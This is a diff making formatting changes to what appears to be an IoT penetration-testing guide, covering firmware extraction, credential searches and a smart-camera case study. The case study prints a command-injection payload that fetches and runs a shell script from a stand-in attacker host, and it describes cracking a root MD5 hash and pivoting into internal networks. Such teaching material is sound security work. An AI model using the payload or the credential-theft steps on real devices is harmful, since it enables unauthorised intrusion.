@@ -73,7 +73,7 @@
 \li{Extract from UART bootloader console (U-Boot: \code{\startverb md.b\stopverb} memory dump)}
 \li{\strong{Firmware unpacking}: \code{\startverb binwalk -e firmware.bin\stopverb} to extract filesystem, kernel, and bootloader components}
 \li{\strong{Filesystem analysis}:}
-\li{Search for credentials: \code{\startverb grep -rn "password\|passwd\|secret\|key" squashfs-root/\stopverb}}
+\li{\startverb Search for credentials: `grep -rn "password\|passwd\|secret\|key" squashfs-root/`\stopverb}
 \li{Examine \code{\startverb /etc/shadow\stopverb} for password hashes}
 \li{Review startup scripts in \code{\startverb /etc/init.d/\stopverb} for insecure service configurations}
 \li{Identify web server configurations and CGI scripts for web interface vulnerabilities}
@@ -164,7 +164,7 @@
 \ol{
 \li{Open the camera and identify UART pins on the PCB; connect and access a root shell at 115200 baud with no password}
 \li{Extract firmware from the SPI flash chip and analyze with Binwalk: discover embedded Linux with BusyBox, lighttpd web server, and custom management daemon}
-\li{Find hardcoded credentials in \code{\startverb /etc/shadow\stopverb} (root:$1$abc$hashedpassword) and crack the MD5 hash in seconds (password: camera123)}
+\li{\startverb Find hardcoded credentials in `/etc/shadow` (root:$1$abc$hashedpassword) and crack the MD5 hash in seconds (password: camera123)\stopverb}
 \li{Web interface testing reveals command injection in the NTP server configuration field: \code{\startverb ; wget http://attacker.com/shell.sh | sh\stopverb}}
 \li{Network analysis shows the camera sends RTSP streams unencrypted and has ONVIF services exposed without authentication}
 \li{Demonstrate pivoting: from the compromised camera, scan the corporate network and access 3 internal servers}
